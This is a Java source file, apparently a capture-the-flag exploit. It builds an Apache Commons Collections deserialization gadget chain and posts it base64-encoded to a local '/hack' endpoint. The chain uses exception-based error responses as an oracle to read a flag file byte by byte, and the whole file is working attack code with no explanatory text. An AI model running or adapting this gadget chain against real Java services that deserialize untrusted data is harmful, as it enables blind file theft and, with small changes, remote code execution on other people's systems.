import okhttp3.FormBody;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.joor.Reflect;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CCRead {
    public static void main(String[] args) throws Exception {
        String flag = "";
        String possible = "abcdefghijklmnopqrstuvwxyz_{}ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        while (true) {
            boolean success = false;
            for (char c : possible.toCharArray()) {
                if (guess(flag.length(), c) == 200) {
                    flag += c;
                    System.out.println("[+]" + flag.length() + ":" + flag);
                    success = true;
                    break;
                }
            }
            if (!success)
                break;
        }
    }

    public static int guess(int index, char c) throws Exception {
        Transformer[] transformers = {
                new ClosureTransformer(
                        new IfClosure(
                                new EqualPredicate((int) c),
                                NOPClosure.getInstance(),
                                ExceptionClosure.getInstance()
                        )
                ),
                new InvokerTransformer("read", null, null),
                new ClosureTransformer(
                        new ForClosure(index, new TransformerClosure(new InvokerTransformer("read", null, null)))
                ),
                new InvokerTransformer("getInputStream", null, null),
                new InvokerTransformer("openConnection", null, null),
                new ConstantTransformer(new URL("file:///E:/flag.txt"))
        };

        Object gadget = chain(transformers);
        return send(gadget);
    }

    public static Object chain(Transformer... transformers) {
        HashMap<Object, Object> map1 = new HashMap<>();
        map1.put("yy", 1);
        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put("zZ", 1);

        Map lazyMap2 = LazyMap.decorate(map2, new ConstantTransformer(2));
        Hashtable<Object, Object> evil = new Hashtable<>();
        evil.put(map1, 1);
        evil.put(lazyMap2, 2);

        Map<?, ?> map = map2;
        for (Transformer transformer : transformers) {
            map = TransformedMap.decorate(map, null, transformer);
        }

        Reflect.on(lazyMap2).set("map", map);
        map2.remove("yy");

        return evil;
    }

    public static int send(Object gadget) {
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        try {
            ObjectOutputStream oos = new ObjectOutputStream(outputStream);
            oos.writeObject(gadget);
            oos.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }

        String encodedPayload = Base64.getEncoder().encodeToString(outputStream.toByteArray());

        FormBody formBody = new FormBody.Builder()
                .add("exp", encodedPayload)
                .build();

        HttpUrl url = new HttpUrl.Builder()
                .scheme("http")
                .host("localhost")
                .port(8080)
                .addPathSegment("hack")
                .build();

        Request request = new Request.Builder()
                .url(url)
                .post(formBody)
                .build();

        OkHttpClient client = new OkHttpClient();
        try {
            okhttp3.Response response = client.newCall(request).execute();
            return response.code();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return -1;
    }
}
